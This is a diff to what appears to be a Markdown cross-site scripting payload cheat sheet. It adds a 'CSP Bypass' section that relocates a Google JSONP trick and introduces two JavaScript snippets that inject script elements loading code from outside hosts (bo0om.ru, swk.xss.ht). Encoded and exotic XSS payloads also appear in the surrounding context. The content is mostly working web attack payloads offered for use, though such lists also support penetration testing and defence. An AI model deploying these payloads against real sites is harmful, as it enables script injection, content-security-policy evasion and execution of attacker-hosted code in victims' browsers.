@@ -9,6 +9,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 - [XSS in files](#xss-in-files)
 - [Polyglot XSS](#polyglot-xss)
 - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
+- [CSP Bypas](#csp-bypass)
 - [Common WAF Bypas](#common-waf-bypass)
 
 ## Exploit code or POC
@@ -662,12 +663,6 @@ Little Endian : 0xFF 0xFE 0x00 0x00
 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
 ```
 
-Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
-//google.com/complete/search?client=chrome&jsonp=alert(1);
-
-```js
-<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
-```
 
 Bypass using weird encoding or native interpretation to hide the payload (alert())
 
@@ -694,6 +689,32 @@ Exotic payloads
 <img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
 <svg><x><script>alert&#40;&#39;1&#39;&#41</x>
 <iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+```
+
+## CSP Bypass
+
+### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
+
+//google.com/complete/search?client=chrome&jsonp=alert(1);
+
+```js
+<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
+```
+
+### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa
+
+Works for CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, [POC here](http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;)
+
+```js
+script=document.createElement('script');
+script.src='//bo0om.ru/csp.js';
+window.frames[0].document.head.appendChild(script);
+```
+
+### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
+
+```js
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://swk.xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
 ```
 
 ## Common WAF Bypass
